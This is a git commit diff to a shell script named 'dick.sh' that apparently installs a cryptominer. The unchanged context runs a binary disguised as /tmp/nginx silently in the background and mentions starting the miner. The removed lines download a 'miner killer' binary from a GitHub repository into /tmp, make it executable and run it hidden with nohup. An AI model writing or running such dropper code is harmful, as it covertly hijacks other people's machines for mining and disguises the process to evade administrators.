9ae8e4afc1e8b4c83539000e566186f7697fc84b
evilqeo <qeo240@gmail.com>
2025-05-23 15:09:37 +0530

    Update dick.sh

--- dick.sh
+++ dick.sh
@@ -48,9 +48,7 @@ nohup /tmp/nginx > /dev/null 2>&1 &
 ####################################
 # 🛑 Download and run miner killer
 ####################################
-$DOWNLOAD_CMD /tmp/sleeping https://github.com/evilqeo/frcx/raw/main/sleeping
-chmod +x /tmp/sleeping
-nohup /tmp/sleeping > /dev/null 2>&1 &
+
 ####################################
 
 # Start miner normally
